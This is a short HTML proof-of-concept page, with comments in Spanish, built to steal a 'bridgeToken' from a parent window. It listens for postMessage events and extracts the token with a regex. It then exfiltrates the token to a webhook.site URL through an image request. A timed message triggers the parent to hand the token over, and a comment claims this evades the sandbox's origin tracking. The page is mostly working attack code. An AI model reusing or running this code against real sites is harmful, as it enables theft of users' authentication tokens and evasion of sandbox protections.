<!DOCTYPE html>
<html>
<body>
    <h2>Token Replay Async</h2>
    <pre id="log" style="background:#000; color:#0f0; padding:10px; min-height:100px;"></pre>

    <script>
        const logEl = document.getElementById('log');
        const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";

        function log(msg) {
            logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        }

        // 1. Escuchar mensajes del padre
        window.addEventListener("message", (event) => {
            const dataString = JSON.stringify(event.data);
            log(`📩 Mensaje de ${event.origin}: ${dataString}`);

            if (dataString.includes("bridgeToken")) {
                const match = dataString.match(/"bridgeToken":"([^"]+)"/);
                if (match) {
                    const token = match[1];
                    log(`🔑 Token robado: ${token}`);
                    // Exfiltrar
                    const img = new Image();
                    img.src = `${webhookUrl}?async_token=${encodeURIComponent(token)}`;
                }
            }
        });

        // 2. Forzar al padre a enviar el token usando una llamada ASÍNCRONA
        // (El Sandbox no puede rastrear el origen de las llamadas por temporizador)
        setTimeout(() => {
            log("Enviando petición asíncrona al padre...");
            window.parent.postMessage({ type: "cvm-bridge:request-document" }, "*");
        }, 1000);

        log("Listener activo. Esperando token...");
    </script>
</body>
</html>
